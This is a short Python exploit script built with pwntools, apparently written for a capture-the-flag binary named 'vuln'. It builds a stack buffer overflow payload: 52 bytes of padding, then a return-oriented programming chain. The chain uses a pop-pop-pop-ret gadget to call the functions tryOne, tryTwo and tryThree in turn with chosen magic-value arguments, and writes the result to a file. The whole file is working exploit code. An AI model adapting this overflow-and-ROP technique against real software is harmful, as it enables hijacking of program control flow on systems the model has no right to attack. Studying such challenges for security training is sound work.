from pwn import *

import struct

binary = context.binary = ELF('./vuln')
print((p32(binary.sym.tryThree)))
# print(struct.pack("I", 0x080490f0))
gadget = struct.pack("I", 0x080493d1) # pop esi ; pop edi ; pop ebp ; ret
buf  = b"A" * 52
buf += gadget
buf += struct.pack("I", 0xdeadbeef)
buf += struct.pack("I", 0xf00dcafe)
buf += struct.pack("I", 0xd00dface)
buf += p32(binary.sym.tryOne-4) # tryOne()
buf += gadget
buf += struct.pack("I", 0xdeadbeef)
buf += struct.pack("I", 0xf00dcafe)
buf += struct.pack("I", 0xd00dface)
buf += p32(binary.sym.tryTwo-4) # tryTwo()
buf += gadget
buf += struct.pack("I", 0xf00dcafe)
buf += struct.pack("I", 0xd00dface)
buf += struct.pack("I", 0xdeadbeef)
buf += p32(binary.sym.tryThree-4) # tryThree()
buf += gadget
buf += struct.pack("I", 0xd00dface)
buf += struct.pack("I", 0xdeadbeef)
buf += struct.pack("I", 0xf00dcafe)

with open('exp', 'wb') as exp:
    exp.write(buf)